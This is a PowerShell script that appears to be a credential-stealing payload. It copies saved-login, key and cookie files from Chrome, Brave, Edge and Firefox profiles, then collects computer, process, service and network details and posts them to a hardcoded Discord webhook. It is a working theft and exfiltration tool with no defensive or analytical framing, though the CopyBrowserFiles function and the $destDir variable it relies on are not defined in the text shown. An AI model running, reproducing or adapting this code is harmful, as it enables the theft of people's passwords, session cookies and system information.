# Define Discord Webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1305915579269386260/XFWxT4Q5T71Pht4mBOg9bd6y_R5fcBNmD3E7TuoesCLM7SmAC2O7yXvnKXRAYSKJOK9P"

# Function to send data to Discord webhook
function SendToDiscord {
    param (
        [string]$message
    )
    $payload = @{
        content = $message
    } | ConvertTo-Json

    try {
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
    } catch {
        Write-Host "Error sending data to Discord: $_"
    }
}

# Configuration for Google Chrome
$chromeDir = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
$chromeFilesToCopy = @("Login Data")
CopyBrowserFiles "Chrome" $chromeDir $chromeFilesToCopy
Copy-Item -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Chrome") -ErrorAction SilentlyContinue

# Send Chrome info to Discord
SendToDiscord "Chrome Login Data and Local State copied."

# Configuration for Brave
$braveDir = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
$braveFilesToCopy = @("Login Data")
CopyBrowserFiles "Brave" $braveDir $braveFilesToCopy
Copy-Item -Path "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Brave") -ErrorAction SilentlyContinue

# Send Brave info to Discord
SendToDiscord "Brave Login Data and Local State copied."

# Configuration for Firefox
$firefoxProfileDir = Join-Path -Path $env:APPDATA -ChildPath "Mozilla\Firefox\Profiles"
$firefoxProfile = Get-ChildItem -Path $firefoxProfileDir -Filter "*.default-release" | Select-Object -First 1
if ($firefoxProfile) {
    $firefoxDir = $firefoxProfile.FullName
    $firefoxFilesToCopy = @("logins.json", "key4.db", "cookies.sqlite", "webappsstore.sqlite", "places.sqlite")
    CopyBrowserFiles "Firefox" $firefoxDir $firefoxFilesToCopy
    SendToDiscord "Firefox login data and profile copied."
} else {
    Write-Host "Firefox - Nessun profilo trovato."
    SendToDiscord "Firefox profile not found."
}

# Configuration for Microsoft Edge
$edgeDir = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
$edgeFilesToCopy = @("Login Data")
CopyBrowserFiles "Edge" $edgeDir $edgeFilesToCopy
Copy-Item -Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Edge") -ErrorAction SilentlyContinue

# Send Edge info to Discord
SendToDiscord "Edge Login Data and Local State copied."

# Gather additional system information
function GatherSystemInfo {
    $sysInfoDir = "$duckletter\$env:USERNAME\SystemInfo"
    if (-Not (Test-Path $sysInfoDir)) {
        New-Item -ItemType Directory -Path $sysInfoDir
    }

    Get-ComputerInfo | Out-File -FilePath "$sysInfoDir\computer_info.txt"
    Get-Process | Out-File -FilePath "$sysInfoDir\process_list.txt"
    Get-Service | Out-File -FilePath "$sysInfoDir\service_list.txt"
    Get-NetIPAddress | Out-File -FilePath "$sysInfoDir\network_config.txt"

    # Send System Info to Discord
    $computerInfo = Get-Content "$sysInfoDir\computer_info.txt" | Out-String
    $processList = Get-Content "$sysInfoDir\process_list.txt" | Out-String
    $serviceList = Get-Content "$sysInfoDir\service_list.txt" | Out-String
    $networkConfig = Get-Content "$sysInfoDir\network_config.txt" | Out-String

    $systemMessage = @"
System Information:
---------------------------
Computer Info: $computerInfo
Process List: $processList
Service List: $serviceList
Network Config: $networkConfig
"@

    SendToDiscord $systemMessage
}

# Gather system info and send it
GatherSystemInfo
